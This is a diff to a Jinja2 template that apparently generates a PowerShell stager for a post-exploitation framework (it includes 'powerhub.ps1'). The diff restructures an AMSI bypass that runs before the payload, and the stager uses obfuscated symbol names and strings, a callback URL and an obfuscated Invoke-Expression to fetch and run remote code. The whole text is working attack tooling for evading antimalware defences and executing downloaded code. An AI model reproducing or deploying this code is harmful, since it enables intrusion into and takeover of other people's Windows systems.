@@ -1,4 +1,7 @@
 {% from 'macros.jinja2' import obfuscate with context%}
+
+{% if amsibypass %}
+
 ${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
 ${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 
@@ -15,21 +18,24 @@ function {{symbol_name("Decrypt-String")}} {
     ${{symbol_name("result")}}
 }
 
+if ($PSVersionTable.PSVersion.Major -ge 5) {
+        try {
+        {% include amsibypass %}
+        } catch {
+            Write-Error (-join ({{obfuscate("AMSI Bypass failed: ")}}, $_))
+        }
+}
+
+{% endif %}
+{% if transport %}
+
 {% if exec_clipboard_entry %}
     ${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"
 {% else %}
     ${{symbol_name("clip_entry")}} = ""
 {% endif %}
 
-if ($PSVersionTable.PSVersion.Major -ge 5) {
-    {% if amsibypass %}
-        try {
-        {% include amsibypass %}
-        } catch {
-            Write-Error (-join ({{obfuscate("AMSI Bypass failed: ")}}, $_))
-        }
-    {% endif %}
-}
+${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
 
 {% if transport in ['http', 'https'] %}
     ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
@@ -45,7 +51,17 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
     {# TODO #}
 {% endif %}
 
+
+{% if amsibypass %}
+{# If amsibypass has been included in the same file, load the rest in an extra request. Else, include it in jinja because we can assume AMSI has been disabled #}
+
 ${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "h"
 
-
 & (g`Cm {{obfuscate("Invoke-Expression")}}) ${{symbol_name("Code")}}
+
+{% else %}
+
+{% include 'powershell/powerhub.ps1' %}
+
+{% endif %}
+{% endif %}
